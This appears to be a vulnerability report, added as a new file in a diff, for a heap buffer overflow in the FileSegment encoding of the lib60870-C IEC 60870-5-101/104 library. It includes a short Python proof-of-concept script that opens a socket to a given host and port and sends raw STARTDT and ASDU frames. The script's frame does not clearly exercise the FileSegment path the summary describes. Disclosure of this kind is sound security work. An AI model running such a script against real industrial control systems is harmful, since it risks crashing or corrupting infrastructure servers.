@@ -1,0 +1,28 @@
+issue #201
+
+Summary
+A heap-based buffer overflow exists in lib60870-C v2.4.0 in the FileSegment information object encoding path used when constructing outgoing CS101/CS104 ASDUs.
+
+The issue is triggered when a server-side application uses the public API to create a file-transfer ASDU and appends multiple FileSegment information objects with CS101_ASDU_addInformationObject(...). The first FileSegment can legally fill the ASDU payload exactly. A subsequent FileSegment is then still encoded even though no payload space remains. During the second addition, the library writes beyond the heap-allocated ASDU object.
+
+PoC
+
+import socket, struct, time, sys
+host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
+port = int(sys.argv[2]) if len(sys.argv) > 2 else 2711
+STARTDT_ACT=b"\x68\x04\x07\x00\x00\x00"
+asdu = bytes([100,1,6,0,1,0,0,0,0,20])
+def ctrl_i(ns,nr): return struct.pack('<HH', ns << 1, nr << 1)
+def apdu_i(ns,nr,asdu): return b"\x68"+bytes([4+len(asdu)])+ctrl_i(ns,nr)+asdu
+s = socket.create_connection((host, port))
+s.sendall(STARTDT_ACT)
+try:
+    data = s.recv(64)
+    print('STARTDT resp', data.hex())
+except Exception as e:
+    print('recv err', e)
+s.sendall(apdu_i(0,0,asdu))
+time.sleep(0.5)
+s.close()
+
+python3 poc.py 127.0.0.1 2711
